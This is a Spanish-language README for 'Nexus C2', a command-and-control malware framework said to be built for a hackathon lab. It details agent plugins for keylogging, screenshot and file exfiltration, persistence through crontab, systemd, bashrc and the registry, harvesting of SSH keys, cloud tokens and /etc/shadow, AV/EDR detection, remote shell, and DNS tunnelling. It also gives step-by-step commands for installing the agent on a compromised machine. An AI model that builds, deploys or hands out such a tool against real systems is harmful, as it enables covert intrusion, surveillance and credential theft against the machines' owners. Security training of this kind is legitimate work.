# Nexus C2

Framework de Command & Control desarrollado para la **Hackathon Aligo — Defensores Informáticos (Talento Tech)**. Entorno de laboratorio cerrado y autorizado.

---

## Descripción

Nexus C2 es un sistema de comando y control con protocolo binario propio, cifrado de extremo a extremo y panel web integrado. Permite controlar múltiples agentes de forma simultánea desde un navegador, ejecutar comandos de shell, y lanzar plugins especializados de reconocimiento, persistencia, exfiltración y evasión.

---

## Arquitectura

```
OPERADOR (navegador)
      │
      │  HTTP / WebSocket
      ▼
SERVIDOR C2 — broker async (aiohttp)  ←  Panel web integrado en GET /
      │
      │  Protocolo Nexus binario  →  POST / o WS /ws
      │  X-Session-Id en cabecera HTTP
      ├──────────────┬──────────────┐
      ▼              ▼              ▼
  AGENTE 1       AGENTE 2      AGENTE N
 (Linux/Pi)     (Windows)      (macOS)
```

---

## Características principales

- **Protocolo binario propio** — frame `[TYPE 1B][NONCE 12B][CIPHERTEXT+TAG]`
- **Forward secrecy por sesión** — intercambio X25519 (ECDH) efímero en cada handshake
- **Cifrado autenticado** — ChaCha20-Poly1305 (AEAD) con nonce por contador
- **Múltiples transportes** — HTTP polling, WebSocket persistente, túnel DNS (UDP :5354)
- **Panel web integrado** — servido directamente por el servidor C2 en `GET /`
- **Sistema de plugins** — extensible con prefijo `!`, whitelist de seguridad
- **Beaconing con jitter** — patrón de tráfico no determinista
- **Navegación de directorios persistente** — `cd` mantiene estado entre comandos
- **Vista de agentes** — muestra usuario, hostname y OS de cada máquina infectada
- **Exfiltración de archivos** — endpoint `/exfil` con visualizador en el panel

---

## Estructura del repositorio

```
├── protocol.py              # Codec, handshake, criptografía (compartido agente/servidor)
├── requirements.txt         # Dependencias del servidor
├── server/
│   └── broker.py            # Servidor C2 async + panel web (HTML embebido)
├── agent/
│   ├── agent.py             # Loop de beaconing, ejecución de comandos, plugins
│   └── plugins/
│       ├── __init__.py      # Registry y dispatcher de plugins
│       ├── sysinfo.py       # Info del sistema (OS, CPU, RAM, red, disco)
│       ├── screenshot.py    # Captura de pantalla + auto-exfil al C2
│       ├── keylog.py        # Keylogger (pynput en X11/Windows, evdev en Wayland)
│       ├── persist.py       # Persistencia: crontab → systemd → ~/.bashrc / registry
│       ├── exfil.py         # Exfiltración de archivos al servidor C2
│       ├── download.py      # Descarga de archivos desde internet al agente
│       ├── cat.py           # Lectura de archivos y directorios
│       ├── clip.py          # Lectura/escritura del portapapeles
│       ├── nmcli.py         # Reconocimiento de red via NetworkManager (Linux)
│       ├── mimikatz.py      # Harvesting de credenciales Linux
│       ├── unhook.py        # Detección de AV/EDR, hooks y tracers
│       └── notify.py        # Mensajes en pantalla de la víctima en tiempo real
├── deploy/
│   ├── build_package.sh     # Genera el paquete del agente listo para desplegar
│   ├── install.sh           # Instalador del agente en la máquina vulnerada
│   ├── config.env           # IP del servidor C2 y transporte
│   ├── requirements-agent.txt  # Dependencias del agente (sin aiohttp)
│   └── INSTALL.md           # Guía de despliegue paso a paso
└── docs/
    ├── Nexus_Documentacion_Tecnica.md
    ├── arquitectura.md
    └── bitacora.md
```

---

## Instalación

### Servidor C2

```bash
git clone https://github.com/Danieldlr13/Command-and-Control-C2.git
cd Command-and-Control-C2
pip install -r requirements.txt
python3 -m server
```

El servidor escucha en `0.0.0.0:8080`. El panel web está disponible en `http://localhost:8080`.

### Agente (máquina vulnerada)

**Opción A — despliegue rápido desde el servidor:**

```bash
# 1. Editar la IP del servidor C2
nano deploy/config.env

# 2. Generar paquete
./deploy/build_package.sh

# 3. Copiar a la máquina vulnerada
scp -r nexus-agent/ usuario@<IP>:~/nexus-agent

# 4. En la máquina vulnerada
cd ~/nexus-agent && ./install.sh
```

**Opción B — desde el repo (lab local):**

```bash
NEXUS_SERVER=http://<IP_SERVIDOR>:8080 \
NEXUS_SERVER_PUB=$(cat server_pub.hex) \
python3 -m agent
```

---

## Plugins disponibles

| Plugin | Descripción | OS |
|--------|-------------|-----|
| `!sysinfo` | Info completa del sistema: OS, CPU, RAM, red, disco | Todos |
| `!screenshot` | Captura pantalla y la exfiltra automáticamente al C2 | Todos |
| `!keylog start\|dump\|stop` | Keylogger en background (pynput / evdev fallback Wayland) | Todos |
| `!persist` | Instala persistencia: crontab → systemd → ~/.bashrc (Linux) / registry (Windows) | Todos |
| `!exfil <ruta>` | Sube un archivo al servidor C2. Máx 50 MB | Todos |
| `!download <url> <dest>` | Descarga desde internet a la máquina vulnerada | Todos |
| `!cat <ruta>` | Lee archivos o lista directorios. `--hex` para binarios | Todos |
| `!clip read` | Lee el portapapeles de la víctima | Todos |
| `!clip write <texto>` | Escribe en el portapapeles de la víctima | Todos |
| `!nmcli [wifi\|saved\|passwords\|ifaces]` | Reconocimiento de red via NetworkManager | Linux |
| `!mimikatz` | Harvesting: historial shell, SSH keys, tokens cloud, /etc/shadow | Linux |
| `!unhook` | Detecta LD_PRELOAD, tracers, hooks en memoria y procesos AV/EDR | Linux |
| `!notify <mensaje>` | Muestra un mensaje en pantalla de la víctima en tiempo real | Todos |

Los comandos sin prefijo `!` se ejecutan directamente como shell. `cd` mantiene el directorio entre comandos.

---

## Panel web

El panel es una Single Page App servida por el propio servidor C2 en `GET /`. No requiere build ni framework externo.

**Funcionalidades:**
- Lista de agentes con **usuario**, **hostname** y **OS** detectados automáticamente
- Terminal por agente con historial de comandos (↑/↓)
- Barra de plugins por OS (Linux / Windows) con botones de acción rápida
- Shell rápido con comandos frecuentes por plataforma
- Visualizador de archivos exfiltrados
- Indicador visual de latencia de beacon (jitter bar)
- Modal de ayuda con referencia completa de plugins

---

## Protocolo

| TYPE | Nombre  | Dirección        | Descripción |
|------|---------|------------------|-------------|
| 0x01 | HELLO   | agente → servidor | Handshake: clave pública X25519 efímera |
| 0x02 | WELCOME | servidor → agente | Clave servidor + session_id |
| 0x03 | BEACON  | agente → servidor | Latido con agent_id, hostname, username, OS |
| 0x04 | TASK    | servidor → agente | Comando con task_id UUID |
| 0x05 | RESULT  | agente → servidor | stdout + stderr + exit_code |
| 0x06 | NOP     | servidor → agente | Sin tareas pendientes |
| 0x07 | ERROR   | ambos             | Error de protocolo |

---

## Criptografía

| Primitiva | Uso |
|-----------|-----|
| X25519 (ECDH) | Intercambio de claves con forward secrecy por sesión |
| HKDF-SHA256 | Derivación de `session_key` desde el secreto compartido |
| ChaCha20-Poly1305 | Cifrado autenticado (AEAD) de todos los mensajes post-handshake |

---

## Transportes

| Transporte | Configuración | Descripción |
|------------|--------------|-------------|
| HTTP | `NEXUS_TRANSPORT=http` | Polling sobre HTTP POST (default) |
| WebSocket | `NEXUS_TRANSPORT=ws` | Conexión persistente, menor latencia |
| DNS | `NEXUS_TRANSPORT=dns` | Túnel DNS sobre UDP :5354 |

---

## Dependencias

**Servidor:**
```
aiohttp>=3.9
cryptography>=40.0
```

**Agente:**
```
cryptography>=40.0
requests>=2.31
pynput>=1.7
mss>=9.0
evdev>=1.6          # solo Linux (keylogger Wayland)
Pillow>=9.0         # solo Windows (screenshot)
```

---

## Contexto

Proyecto desarrollado en el marco de la **Hackathon Aligo — Defensores Informáticos (Talento Tech)**, en un entorno de laboratorio cerrado y autorizado. El uso de este software fuera de ese contexto es responsabilidad exclusiva del usuario.
